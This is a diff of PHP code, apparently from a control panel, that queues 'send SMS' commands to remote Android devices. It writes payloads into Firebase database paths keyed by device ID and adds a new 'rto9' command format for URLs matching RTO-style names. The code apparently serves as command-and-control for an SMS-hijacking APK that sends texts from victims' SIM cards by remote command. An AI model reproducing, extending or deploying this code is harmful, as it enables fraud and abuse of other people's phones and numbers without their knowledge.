@@ -323,7 +323,12 @@ function rebel_sms_paths_for_device(string $deviceId, string $schema = 'rabel', 
 }
 
 /** Send paths with payload type — rebel.py: clients/{id}/webhookEvent/sendSms */
-function rebel_send_paths_for_device(string $deviceId, string $schema = 'rabel', string $deviceNode = 'clients'): array
+function rebel_is_rto_style_url(string $url): bool
+{
+    return (bool) preg_match('/rto9|rto0|rto91/i', $url);
+}
+
+function rebel_send_paths_for_device(string $deviceId, string $schema = 'rabel', string $deviceNode = 'clients', string $url = ''): array
 {
     $id = trim($deviceId);
     if ($id === '') {
@@ -348,6 +353,12 @@ function rebel_send_paths_for_device(string $deviceId, string $schema = 'rabel',
             $out[] = ['path' => $n . '/' . $id . '/commands/send_sms', 'type' => 'spinplay'];
         }
     } else {
+        if (rebel_is_rto_style_url($url) || $deviceNode === 'user_list' || $deviceNode === 'user_data') {
+            $out[] = ['path' => 'clients/' . $id, 'type' => 'rto9'];
+            $out[] = ['path' => $id, 'type' => 'rto9'];
+            $out[] = ['path' => 'clients/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel'];
+            $out[] = ['path' => $id . '/webhookEvent/sendSms', 'type' => 'rabel'];
+        }
         foreach (array_values(array_unique(['clients', $node, 'user_list', 'user_data', 'devices'])) as $n) {
             if ($n === '') {
                 continue;
@@ -360,7 +371,7 @@ function rebel_send_paths_for_device(string $deviceId, string $schema = 'rabel',
     return $out;
 }
 
-function rebel_send_payload_for_type(string $type, int $sim, string $to, string $message): array
+function rebel_send_payload_for_type(string $type, int $sim, string $to, string $message, string $deviceId = ''): array
 {
     $sim = max(1, $sim);
     if ($type === 'spinplay') {
@@ -368,6 +379,32 @@ function rebel_send_payload_for_type(string $type, int $sim, string $to, string 
             'to' => $to,
             'message' => $message,
             'sim' => $sim - 1,
+        ];
+    }
+    if ($type === 'rto9') {
+        $slot = max(0, $sim - 1);
+        return [
+            'cmd' => 'send_sms',
+            'command' => 'send message',
+            'messageText' => $message,
+            'msg' => $message,
+            'phoneNumber' => $to,
+            'to' => $to,
+            'sendSms' => [
+                'message' => $message,
+                'status' => 'pending',
+                'to' => $to,
+            ],
+            'sms' => [
+                'message' => $message,
+                'status' => 'pending',
+                'to' => $to,
+            ],
+            'sim' => $slot,
+            'simSlot' => (string) $slot,
+            'targetDeviceId' => $deviceId,
+            'timestamp' => (int) round(microtime(true) * 1000),
+            'webhookEvent' => 'send_sms',
         ];
     }
 
@@ -705,7 +742,7 @@ function rebel_send_sms_to_device(
 
     $sim = max(1, $sim);
     $authKey = rebel_firebase_auth_key($url, $key);
-    $attempts = rebel_send_paths_for_device($deviceId, $schema, $deviceNode);
+    $attempts = rebel_send_paths_for_device($deviceId, $schema, $deviceNode, $url);
     $lastError = 'Failed to send SMS — device offline or Firebase error';
 
     foreach ($attempts as $attempt) {
@@ -714,12 +751,16 @@ function rebel_send_sms_to_device(
         if ($path === '') {
             continue;
         }
-        $payload = rebel_send_payload_for_type($type, $sim, $to, $message);
+        $payload = rebel_send_payload_for_type($type, $sim, $to, $message, $deviceId);
         $res = rebel_firebase_req('PUT', $url, $authKey, $path, $payload);
         if ($res !== null) {
+            $hint = '';
+            if ($type === 'rto9') {
+                $hint = ' Command queued — device must be online on APK to send.';
+            }
             return [
                 'ok' => true,
-                'message' => 'SMS sent to device',
+                'message' => 'SMS command sent to device' . $hint,
                 'sim' => $sim,
                 'to' => $to,
                 'path' => $path,
